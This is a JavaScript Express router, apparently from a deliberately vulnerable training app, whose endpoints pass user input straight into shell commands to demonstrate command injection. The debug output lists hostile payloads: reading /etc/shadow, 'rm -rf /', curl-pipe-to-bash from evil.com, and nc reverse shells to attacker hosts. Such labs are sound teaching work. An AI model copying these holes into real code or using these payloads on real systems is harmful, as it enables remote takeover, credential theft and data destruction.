/**
 * 🚨 ENDPOINTS VULNERÁVEIS DE COMMAND INJECTION
 * 
 * ⚠️ Estes endpoints são INTENCIONALMENTE VULNERÁVEIS
 * 🎓 Para demonstração educacional de Command Injection
 * 🚨 NÃO usar em produção!
 */

const express = require('express');
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const logger = require('../middleware/logger');
const { vulnerableAuth } = require('../middleware/auth');

const router = express.Router();

// ============================================
// 🚨 PING COMMAND - COMMAND INJECTION BÁSICO
// ============================================
router.post('/ping', (req, res) => {
  const { host, count = 4, timeout = 5 } = req.body;
  
  logger.logSensitive('Command Injection - Ping attempt', { 
    host, count, timeout, 
    ip: req.ip,
    user_agent: req.get('User-Agent')
  });
  
  if (!host) {
    return res.status(400).json({
      success: false,
      error: 'Host parameter required',
      debug: {
        hint: 'Try: host=google.com; ls -la',
        examples: [
          'host=127.0.0.1; cat /etc/passwd',
          'host=localhost && whoami',
          'host=test.com | ps aux',
          'host=`whoami`.google.com'
        ]
      }
    });
  }
  
  // 🚨 Command injection vulnerável - concatenação direta
  const command = `ping -c ${count} -W ${timeout} ${host}`;
  
  logger.logVulnerableCommand(command, { host, count, timeout }, req.ip, null);
  
  exec(command, { timeout: 10000 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      execution_time: Date.now(),
      debug: {
        platform: os.platform(),
        hostname: os.hostname(),
        user: os.userInfo().username,
        cwd: process.cwd(),
        env_path: process.env.PATH
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
      result.killed = error.killed;
      result.signal = error.signal;
    }
    
    logger.logSensitive('Command executed', {
      command,
      success: result.success,
      stdout_length: stdout ? stdout.length : 0,
      stderr_length: stderr ? stderr.length : 0,
      ip: req.ip
    });
    
    res.json(result);
  });
});

// ============================================
// 🚨 NETWORK TOOLS - MULTIPLE COMMAND INJECTION
// ============================================
router.post('/network-tools', (req, res) => {
  const { tool, target, options = '' } = req.body;
  
  logger.logSensitive('Network tools command injection attempt', { 
    tool, target, options, 
    ip: req.ip 
  });
  
  let command = '';
  
  switch (tool) {
    case 'ping':
      command = `ping -c 4 ${target} ${options}`;
      break;
    case 'nslookup':
      command = `nslookup ${target} ${options}`;
      break;
    case 'dig':
      command = `dig ${target} ${options}`;
      break;
    case 'traceroute':
      command = `traceroute ${target} ${options}`;
      break;
    case 'netstat':
      command = `netstat ${target} ${options}`;
      break;
    case 'curl':
      command = `curl -I ${target} ${options}`;
      break;
    case 'wget':
      command = `wget --spider ${target} ${options}`;
      break;
    case 'whois':
      command = `whois ${target} ${options}`;
      break;
    default:
      // ⚠️ Tool personalizada - MUITO PERIGOSO!
      command = `${tool} ${target} ${options}`;
  }
  
  logger.logVulnerableCommand(command, { tool, target, options }, req.ip, null);
  
  exec(command, { timeout: 15000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      tool_used: tool,
      target: target,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      system_info: {
        platform: os.platform(),
        arch: os.arch(),
        hostname: os.hostname(),
        uptime: os.uptime(),
        loadavg: os.loadavg(),
        freemem: os.freemem(),
        totalmem: os.totalmem()
      },
      debug: {
        injection_examples: [
          'target=google.com; cat /etc/passwd',
          'target=test.com && id',
          'target=host.com | ls -la /',
          'options=; rm -rf / --no-preserve-root',
          'tool=ls; target=. options=-la'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
    }
    
    res.json(result);
  });
});

// ============================================
// 🚨 FILE OPERATIONS - COMMAND INJECTION
// ============================================
router.post('/file-operations', vulnerableAuth, (req, res) => {
  const { operation, filepath, content, permissions } = req.body;
  
  logger.logSensitive('File operations command injection', { 
    operation, filepath, content, permissions,
    user: req.user,
    ip: req.ip 
  });
  
  let command = '';
  
  switch (operation) {
    case 'read':
      command = `cat ${filepath}`;
      break;
    case 'write':
      command = `echo "${content}" > ${filepath}`;
      break;
    case 'append':
      command = `echo "${content}" >> ${filepath}`;
      break;
    case 'list':
      command = `ls -la ${filepath}`;
      break;
    case 'chmod':
      command = `chmod ${permissions} ${filepath}`;
      break;
    case 'stat':
      command = `stat ${filepath}`;
      break;
    case 'find':
      command = `find ${filepath} -name "*${content}*"`;
      break;
    case 'grep':
      command = `grep -r "${content}" ${filepath}`;
      break;
    default:
      // Operação customizada
      command = `${operation} ${filepath} ${content} ${permissions}`;
  }
  
  logger.logVulnerableCommand(command, req.body, req.ip, req.user);
  
  exec(command, { timeout: 20000, maxBuffer: 2 * 1024 * 1024 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      operation: operation,
      filepath: filepath,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      user_context: req.user,
      debug: {
        cwd: process.cwd(),
        env_user: process.env.USER || process.env.USERNAME,
        env_home: process.env.HOME || process.env.USERPROFILE,
        injection_examples: [
          'filepath=/etc/passwd; whoami',
          'filepath=/tmp/test.txt && cat /etc/shadow',
          'content=test; rm -rf /',
          'operation=cat; filepath=/proc/version',
          'filepath=.; operation=ls; content=-la'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
    }
    
    res.json(result);
  });
});

// ============================================
// 🚨 SYSTEM INFO - COMMAND EXECUTION
// ============================================
router.get('/system-info', (req, res) => {
  const { detail = 'basic', format = 'json' } = req.query;
  
  logger.logSensitive('System info command injection', { detail, format, ip: req.ip });
  
  let commands = [];
  
  switch (detail) {
    case 'basic':
      commands = ['hostname', 'whoami', 'pwd', 'date'];
      break;
    case 'network':
      commands = ['ifconfig', 'netstat -tuln', 'arp -a', 'route -n'];
      break;
    case 'processes':
      commands = ['ps aux', 'top -b -n 1', 'pstree', 'jobs'];
      break;
    case 'system':
      commands = ['uname -a', 'cat /proc/version', 'cat /proc/cpuinfo | head -20', 'free -h'];
      break;
    case 'security':
      commands = ['cat /etc/passwd', 'cat /etc/shadow', 'sudo -l', 'cat /etc/sudoers'];
      break;
    case 'custom':
      // ⚠️ Comando customizado via query parameter - MUITO PERIGOSO!
      const customCmd = req.query.cmd || 'echo "no command specified"';
      commands = [customCmd];
      break;
    default:
      commands = [detail]; // Trata detail como comando direto!
  }
  
  const results = {};
  let completed = 0;
  
  commands.forEach((cmd, index) => {
    logger.logVulnerableCommand(cmd, { detail, format }, req.ip, null);
    
    exec(cmd, { timeout: 10000 }, (error, stdout, stderr) => {
      results[`command_${index}`] = {
        command: cmd,
        success: !error,
        stdout: stdout,
        stderr: stderr,
        error: error ? error.message : null
      };
      
      completed++;
      
      if (completed === commands.length) {
        const response = {
          success: true,
          detail_level: detail,
          format: format,
          system_info: {
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            user: os.userInfo(),
            uptime: os.uptime(),
            memory: {
              free: os.freemem(),
              total: os.totalmem()
            },
            cpus: os.cpus().length,
            network: os.networkInterfaces()
          },
          command_results: results,
          debug: {
            commands_executed: commands,
            custom_command_example: '?detail=custom&cmd=cat /etc/passwd',
            dangerous_examples: [
              '?detail=cat /etc/shadow',
              '?detail=custom&cmd=rm -rf /',
              '?detail=find / -name "*.key"',
              '?detail=custom&cmd=curl http://evil.com/steal.sh | bash'
            ]
          }
        };
        
        // ⚠️ Diferentes formatos de output
        if (format === 'xml') {
          res.setHeader('Content-Type', 'application/xml');
          res.send(`<?xml version="1.0"?><response>${JSON.stringify(response)}</response>`);
        } else if (format === 'text') {
          res.setHeader('Content-Type', 'text/plain');
          res.send(JSON.stringify(response, null, 2));
        } else {
          res.json(response);
        }
      }
    });
  });
});

// ============================================
// 🚨 LOG VIEWER - COMMAND INJECTION VIA PATH
// ============================================
router.get('/logs', (req, res) => {
  const { 
    file = '/var/log/syslog', 
    lines = 50, 
    grep = '', 
    tail = true,
    format = 'raw' 
  } = req.query;
  
  logger.logSensitive('Log viewer command injection', { 
    file, lines, grep, tail, format, 
    ip: req.ip 
  });
  
  let command = '';
  
  if (tail) {
    command = `tail -${lines} ${file}`;
  } else {
    command = `head -${lines} ${file}`;
  }
  
  if (grep) {
    command += ` | grep "${grep}"`;
  }
  
  // ⚠️ Formato customizado permite command injection
  if (format !== 'raw') {
    command += ` | ${format}`;
  }
  
  logger.logVulnerableCommand(command, req.query, req.ip, null);
  
  exec(command, { timeout: 15000, maxBuffer: 5 * 1024 * 1024 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      log_file: file,
      command_executed: command,
      content: stdout,
      stderr: stderr,
      lines_requested: lines,
      grep_filter: grep,
      debug: {
        available_logs: [
          '/var/log/syslog',
          '/var/log/auth.log',
          '/var/log/apache2/access.log',
          '/var/log/mysql/error.log',
          '/proc/version',
          '/etc/passwd'
        ],
        injection_examples: [
          'file=/etc/passwd; whoami',
          'grep=root; cat /etc/shadow',
          'format=cat /etc/hosts',
          'file=/var/log/auth.log && ls -la /',
          'tail=false&file=/proc/meminfo | head -10'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
    }
    
    res.json(result);
  });
});

// ============================================
// 🚨 BACKUP UTILITY - COMMAND INJECTION
// ============================================
router.post('/backup', vulnerableAuth, (req, res) => {
  const { 
    source, 
    destination = '/tmp/backup', 
    compression = 'gzip', 
    exclude = '',
    options = '' 
  } = req.body;
  
  logger.logSensitive('Backup utility command injection', { 
    source, destination, compression, exclude, options,
    user: req.user,
    ip: req.ip 
  });
  
  // 🚨 Comando de backup vulnerável
  let command = `tar -czf ${destination}/backup_$(date +%Y%m%d_%H%M%S).tar.gz`;
  
  if (exclude) {
    command += ` --exclude="${exclude}"`;
  }
  
  if (compression !== 'gzip') {
    // Permite compressão customizada - PERIGOSO!
    command = command.replace('-czf', `-${compression}f`);
  }
  
  command += ` ${source} ${options}`;
  
  logger.logVulnerableCommand(command, req.body, req.ip, req.user);
  
  exec(command, { timeout: 30000, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      backup_source: source,
      backup_destination: destination,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      user: req.user,
      timestamp: new Date(),
      debug: {
        compression_used: compression,
        exclude_pattern: exclude,
        injection_examples: [
          'source=/home; rm -rf /',
          'destination=/tmp && cat /etc/passwd',
          'compression=czf; whoami',
          'exclude=*.tmp; curl http://evil.com/steal.sh | bash',
          'options=&& nc -e /bin/bash attacker.com 4444'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
      result.signal = error.signal;
    }
    
    res.json(result);
  });
});

// ============================================
// 🚨 PROCESS MANAGER - COMMAND INJECTION
// ============================================
router.post('/process', vulnerableAuth, (req, res) => {
  const { action, process_name, signal = 'TERM', user = '' } = req.body;
  
  logger.logSensitive('Process manager command injection', { 
    action, process_name, signal, user,
    auth_user: req.user,
    ip: req.ip 
  });
  
  let command = '';
  
  switch (action) {
    case 'kill':
      command = `pkill -${signal} ${process_name}`;
      break;
    case 'killall':
      command = `killall -${signal} ${process_name}`;
      break;
    case 'start':
      command = `${process_name} &`;
      break;
    case 'restart':
      command = `pkill ${process_name} && ${process_name} &`;
      break;
    case 'status':
      command = `pgrep -l ${process_name}`;
      break;
    case 'monitor':
      command = `ps aux | grep ${process_name}`;
      break;
    case 'custom':
      // Ação customizada - MUITO PERIGOSO!
      command = req.body.custom_command || 'ps aux';
      break;
    default:
      command = `${action} ${process_name}`;
  }
  
  if (user) {
    command = `sudo -u ${user} ${command}`;
  }
  
  logger.logVulnerableCommand(command, req.body, req.ip, req.user);
  
  exec(command, { timeout: 10000 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      action: action,
      process_name: process_name,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      user_context: req.user,
      debug: {
        available_signals: ['TERM', 'KILL', 'HUP', 'INT', 'QUIT'],
        injection_examples: [
          'process_name=apache; cat /etc/passwd',
          'action=custom&custom_command=rm -rf /',
          'user=root; whoami',
          'process_name=mysql && nc -e /bin/bash evil.com 4444',
          'signal=TERM; curl http://attacker.com/got_access'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
    }
    
    res.json(result);
  });
});

module.exports = router;